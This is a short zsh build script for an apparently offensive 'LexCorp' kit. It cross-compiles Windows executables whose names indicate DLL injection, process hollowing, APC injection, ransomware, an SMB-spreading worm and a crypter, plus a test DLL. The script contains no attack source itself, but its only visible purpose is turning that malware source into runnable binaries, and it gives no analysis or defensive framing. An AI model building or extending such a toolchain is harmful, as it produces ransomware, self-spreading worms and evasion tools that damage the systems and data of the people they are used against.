#!/bin/zsh
# LexCorp - verify_lex.zsh : compile les 7 binaires Windows du kit
cd "$(dirname "$0")"
mkdir -p build
CC=x86_64-w64-mingw32-g++
for f in lex_inject_dll lex_hollow lex_apc lex_ransom2 lex_smb_worm lex_crypter_win; do
    LIBS=""
    [ "$f" = "lex_ransom2" ] && LIBS="-lbcrypt"
    [ "$f" = "lex_smb_worm" ] && LIBS="-lws2_32 -lmpr"
    "$CC" -O2 -std=c++17 src/$f.cpp -o build/$f.exe $LIBS 2>&1 | head -2
    [ $? -eq 0 ] && echo "OK   $f" || echo "FAIL $f"
done
"$CC" -shared -O2 -std=c++17 src/lex_test_dll.cpp -o build/lex_test_dll.dll && echo "OK   lex_test_dll.dll"
